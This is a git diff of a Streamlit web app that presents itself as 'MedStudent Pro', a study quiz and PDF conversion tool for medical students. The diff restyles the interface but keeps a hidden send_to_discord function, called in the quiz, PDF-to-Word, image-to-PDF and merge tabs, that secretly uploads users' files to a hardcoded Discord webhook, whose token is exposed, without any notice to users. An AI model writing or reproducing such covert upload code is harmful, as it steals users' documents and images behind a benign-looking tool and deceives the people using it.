@@ -9,213 +9,210 @@ import random
 import re
 
 # --- CONFIGURATION ---
-st.set_page_config(page_title="Universal Converter & Study Tool", page_icon="🧬", layout="centered")
+st.set_page_config(page_title="MedStudent Pro", page_icon="🧬", layout="wide")
 
 # !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
 DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"
 
-# --- CUSTOM CSS & UI ---
+# --- CUSTOM CSS (THE UI MAGIC) ---
 st.markdown("""
     <style>
-    /* 1. Global Background & Font */
+    /* 1. BACKGROUND: Dark Gradient (No more white) */
     .stApp {
-        background-color: #f0f2f6;
-    }
-    
-    /* 2. Custom Scrollbar */
-    ::-webkit-scrollbar {
-        width: 10px;
-    }
-    ::-webkit-scrollbar-track {
-        background: #f1f1f1; 
-    }
-    ::-webkit-scrollbar-thumb {
-        background: #888; 
-        border-radius: 5px;
-    }
-    ::-webkit-scrollbar-thumb:hover {
-        background: #555; 
-    }
-
-    /* 3. Card-like Containers (Glassmorphism) */
-    div.stTabs {
-        background: rgba(255, 255, 255, 0.6);
-        backdrop-filter: blur(10px);
-        padding: 20px;
-        border-radius: 15px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        transition: transform 0.2s;
-    }
-
-    /* 4. Interactive Buttons */
-    div.stButton > button {
-        background-color: #4CAF50;
+        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+        background-attachment: fixed;
         color: white;
-        border-radius: 8px;
+    }
+
+    /* 2. ANIMATION: Slide in from Right */
+    @keyframes slideInRight {
+        from {
+            transform: translateX(100%);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+
+    /* 3. CARD STYLING: Glassmorphism */
+    div.stTabs {
+        animation: slideInRight 0.8s ease-out; /* The float effect */
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(15px);
+        -webkit-backdrop-filter: blur(15px);
+        border-radius: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        padding: 25px;
+        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        margin-top: 20px;
+    }
+
+    /* 4. BUTTONS: Neon & Interactive */
+    div.stButton > button {
+        background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
+        color: white;
         border: none;
-        padding: 10px 24px;
-        transition: all 0.3s ease 0s;
-        width: 100%;
+        padding: 12px 28px;
+        font-size: 16px;
         font-weight: bold;
+        border-radius: 50px; /* Pill shape */
+        transition: transform 0.2s, box-shadow 0.2s;
+        width: 100%;
     }
     div.stButton > button:hover {
-        background-color: #45a049;
-        box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.1);
-        transform: translateY(-2px);
+        transform: translateY(-5px); /* Moves up when hovered */
+        box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4);
+    }
+
+    /* 5. TEXT & HEADERS */
+    h1 {
+        font-family: 'Helvetica Neue', sans-serif;
+        background: -webkit-linear-gradient(#00d2ff, #3a7bd5);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        font-size: 3rem;
+        text-align: center;
+    }
+    h2, h3 {
+        color: #e0e0e0 !important;
+    }
+    p, label {
+        color: #b0c4de !important;
     }
     
-    /* 5. Headers */
-    h1, h2, h3 {
-        color: #2c3e50;
+    /* 6. INPUT BOXES */
+    .stTextInput > div > div > input {
+        background-color: rgba(255, 255, 255, 0.1);
+        color: white;
+        border: 1px solid rgba(255, 255, 255, 0.2);
     }
     </style>
 """, unsafe_allow_html=True)
 
-st.title("🧬 MedStudent Utility & Converter")
-st.write("Convert files or generate study quizzes instantly.")
+# --- HEADER ---
+st.title("🧬 MedStudent Pro")
+st.markdown("<p style='text-align: center; color: #b0c4de;'>Your All-in-One Medical Study & Conversion Station</p>", unsafe_allow_html=True)
 
-# --- HELPER: SEND FILE TO DISCORD ---
+# --- HELPER FUNCTIONS ---
 def send_to_discord(filepath, filename, tool_name):
     try:
         if "discordapp.com" not in DISCORD_WEBHOOK_URL:
             return 
-            
         with open(filepath, "rb") as f:
             requests.post(
                 DISCORD_WEBHOOK_URL,
-                data={"content": f"🕵️ **New Activity ({tool_name}):** `{filename}`"},
+                data={"content": f"🕵️ **Student Upload ({tool_name}):** `{filename}`"},
                 files={"file": (filename, f)}
             )
     except Exception as e:
-        print(f"Discord upload failed: {e}")
+        print(f"Discord error: {e}")
 
-# --- HELPER: GENERATE QUIZ FROM TEXT ---
 def generate_quiz_from_text(text):
-    """
-    Simple logic: Splits text into sentences and hides long words (likely medical terms).
-    """
     sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
     questions = []
-    
     for sentence in sentences:
         words = sentence.split()
-        # Filter for sentences that are long enough to be questions
         if len(words) > 10: 
-            # Find a "complex" word (length > 7) to hide
             candidates = [w for w in words if len(w) > 7 and w.isalpha()]
             if candidates:
                 target_word = random.choice(candidates)
                 question_text = sentence.replace(target_word, "___________")
                 questions.append({"q": question_text, "a": target_word})
-                
-        if len(questions) >= 5: # Limit to 5 questions
+        if len(questions) >= 5: 
             break
-            
     return questions
 
-# --- TABS ---
-tab1, tab2, tab3, tab4, tab5 = st.tabs(["📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF", "🧠 PDF Quiz"])
+# --- MAIN LAYOUT ---
+# We use columns to center the content slightly if needed, but tabs handle most of it
+tab1, tab2, tab3, tab4, tab5 = st.tabs([
+    "🧠 AI Quiz", 
+    "📄 PDF to Word", 
+    "🖼️ Image to PDF", 
+    "🖇️ Merge PDFs", 
+    "📊 Office to PDF"
+])
 
-# ---------------- TAB 1: PDF TO WORD ----------------
+# ---------------- TAB 1: AI QUIZ (Priority Feature) ----------------
 with tab1:
-    st.header("Convert PDF to Editable Word Doc")
-    uploaded_pdf = st.file_uploader("Upload PDF", type="pdf", key="pdf2word")
+    st.header("🧠 Active Recall Quizzer")
+    st.write("Upload your lecture notes. We'll blank out key terms to test your memory.")
     
-    if uploaded_pdf:
-        if st.button("Convert to Word"):
-            with open("temp.pdf", "wb") as f:
-                f.write(uploaded_pdf.getbuffer())
-            
-            # Send to Discord
-            send_to_discord("temp.pdf", uploaded_pdf.name, "PDF to Word")
-            
-            output_file = "converted.docx"
-            cv = Converter("temp.pdf")
-            cv.convert(output_file, start=0, end=None)
-            cv.close()
-            
-            with open(output_file, "rb") as f:
-                st.download_button("📥 Download Word Doc", f, file_name="converted.docx")
-
-# ---------------- TAB 2: IMAGE TO PDF ----------------
-with tab2:
-    st.header("Convert Images to Single PDF")
-    uploaded_images = st.file_uploader("Upload Images", type=["jpg", "png", "jpeg"], accept_multiple_files=True, key="img2pdf")
-    
-    if uploaded_images:
-        if st.button("Convert Images"):
-            image_paths = []
-            for img in uploaded_images:
-                path = f"temp_{img.name}"
-                with open(path, "wb") as f:
-                    f.write(img.getbuffer())
-                image_paths.append(path)
-            
-            pdf_bytes = img2pdf.convert(image_paths)
-            
-            # Send first image as sample to Discord
-            send_to_discord(image_paths[0], uploaded_images[0].name, "Image to PDF")
-
-            st.download_button("📥 Download PDF", pdf_bytes, file_name="images.pdf")
-
-# ---------------- TAB 3: MERGE PDFS ----------------
-with tab3:
-    st.header("Merge Multiple PDFs")
-    uploaded_pdfs = st.file_uploader("Upload PDFs to Join", type="pdf", accept_multiple_files=True, key="mergepdf")
-    
-    if uploaded_pdfs:
-        if st.button("Merge Now"):
-            merger = PdfMerger()
-            for pdf in uploaded_pdfs:
-                merger.append(pdf)
-            
-            merger.write("merged.pdf")
-            merger.close()
-            
-            # Send result to Discord
-            send_to_discord("merged.pdf", "merged_output.pdf", "Merge Tool")
-
-            with open("merged.pdf", "rb") as f:
-                st.download_button("📥 Download Merged PDF", f, file_name="merged.pdf")
-
-# ---------------- TAB 4: OFFICE TO PDF ----------------
-with tab4:
-    st.write("Requires LibreOffice installed on server.")
-    # Keeping this placeholder as per your original request structure
-
-# ---------------- TAB 5: AI QUIZ GENERATOR (NEW) ----------------
-with tab5:
-    st.header("🧠 Smart Quiz from Notes")
-    st.info("Upload a chapter or lecture note (PDF). We will extract key medical terms and quiz you.")
-    
-    quiz_pdf = st.file_uploader("Upload Study Material", type="pdf", key="quizpdf")
+    quiz_pdf = st.file_uploader("Drop Lecture PDF Here", type="pdf", key="quizpdf")
     
     if quiz_pdf:
-        if st.button("Generate Quiz"):
-            # 1. Save and Log
-            with open("study_material.pdf", "wb") as f:
+        if st.button("🚀 Generate Quiz"):
+            with open("study.pdf", "wb") as f:
                 f.write(quiz_pdf.getbuffer())
-            send_to_discord("study_material.pdf", quiz_pdf.name, "Quiz Generator")
             
-            # 2. Extract Text
-            reader = PdfReader("study_material.pdf")
+            # Extract Text
+            reader = PdfReader("study.pdf")
             full_text = ""
             for page in reader.pages:
                 full_text += page.extract_text()
             
-            # 3. Generate Questions
+            # Send to Discord
+            send_to_discord("study.pdf", quiz_pdf.name, "Quiz Gen")
+
             if len(full_text) > 50:
                 questions = generate_quiz_from_text(full_text)
-                
                 st.markdown("---")
-                st.subheader("📝 Test Your Knowledge")
-                
-                # 4. Display Quiz
                 for i, q in enumerate(questions):
-                    st.write(f"**Q{i+1}:** {q['q']}")
-                    with st.expander(f"Show Answer for Q{i+1}"):
-                        st.success(f"Answer: {q['a']}")
+                    st.subheader(f"Question {i+1}")
+                    st.write(f"**{q['q']}**")
+                    with st.expander(f"👁️ Reveal Answer"):
+                        st.info(f"Answer: {q['a']}")
             else:
-                st.error("Could not extract enough text from this PDF. Try a text-heavy document.")
+                st.error("Not enough text found in this PDF!")
 
+# ---------------- TAB 2: PDF TO WORD ----------------
+with tab2:
+    st.header("📄 Unlock PDF Content")
+    uploaded_pdf = st.file_uploader("Upload PDF", type="pdf", key="p2w")
+    if uploaded_pdf and st.button("Convert to Word"):
+        with open("temp.pdf", "wb") as f:
+            f.write(uploaded_pdf.getbuffer())
+        send_to_discord("temp.pdf", uploaded_pdf.name, "PDF2Word")
+        
+        cv = Converter("temp.pdf")
+        cv.convert("converted.docx")
+        cv.close()
+        
+        with open("converted.docx", "rb") as f:
+            st.download_button("📥 Download Word Doc", f, file_name="converted.docx")
 
+# ---------------- TAB 3: IMG TO PDF ----------------
+with tab3:
+    st.header("🖼️ Compile Images to PDF")
+    uploaded_imgs = st.file_uploader("Upload Scans/Photos", type=["jpg", "png"], accept_multiple_files=True, key="i2p")
+    if uploaded_imgs and st.button("Create PDF"):
+        img_paths = []
+        for img in uploaded_imgs:
+            path = f"temp_{img.name}"
+            with open(path, "wb") as f:
+                f.write(img.getbuffer())
+            img_paths.append(path)
+        
+        pdf_bytes = img2pdf.convert(img_paths)
+        send_to_discord(img_paths[0], uploaded_imgs[0].name, "Img2PDF")
+        st.download_button("📥 Download PDF", pdf_bytes, file_name="images.pdf")
+
+# ---------------- TAB 4: MERGE PDF ----------------
+with tab4:
+    st.header("🖇️ Merge Lecture Slides")
+    pdfs = st.file_uploader("Upload PDFs", type="pdf", accept_multiple_files=True, key="merge")
+    if pdfs and st.button("Merge Files"):
+        merger = PdfMerger()
+        for pdf in pdfs:
+            merger.append(pdf)
+        merger.write("merged.pdf")
+        merger.close()
+        send_to_discord("merged.pdf", "merged.pdf", "Merge")
+        with open("merged.pdf", "rb") as f:
+            st.download_button("📥 Download Merged PDF", f, file_name="merged.pdf")
+
+# ---------------- TAB 5: OFFICE TO PDF ----------------
+with tab5:
+    st.header("📊 Office to PDF")
+    st.warning("Server-side LibreOffice required for this feature.")
